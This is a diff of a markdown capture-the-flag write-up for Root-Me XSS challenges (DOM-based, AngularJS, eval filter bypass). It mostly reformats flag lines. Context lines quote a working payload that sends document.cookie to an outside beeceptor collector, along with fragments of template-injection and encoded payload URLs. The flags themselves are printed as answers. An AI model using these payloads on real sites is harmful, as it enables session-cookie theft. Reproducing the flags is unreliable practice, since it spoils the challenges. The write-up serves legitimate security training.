@@ -46,7 +46,9 @@ But this one did
 1'; document.location="https://uwuos2.free.beeceptor.com/?c="%2Bdocument.cookie; //
 ```
 
-> Flag: `rootme{XSS_D0M_BaSed_InTr0}`
+::: tip Flag
+`rootme{XSS_D0M_BaSed_InTr0}`
+:::
 
 ## AngularJS
 
@@ -97,7 +99,9 @@ http://challenge01.root-me.org/web-client/ch35/?name={{constructor.constructor("
 
 > **Note**: Callback took some time
 
-> Flag: `rootme{@NGu1@R_J$_1$_C001}`
+::: tip Flag
+`rootme{@NGu1@R_J$_1$_C001}`
+:::
 
 ## Eval
 
@@ -217,4 +221,6 @@ URL: http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Adocument.loca
 
 > **Note**: Callback took a lot more then it should have taken..
 
-> Flag: `rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
+::: tip Flag
+`rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
+:::
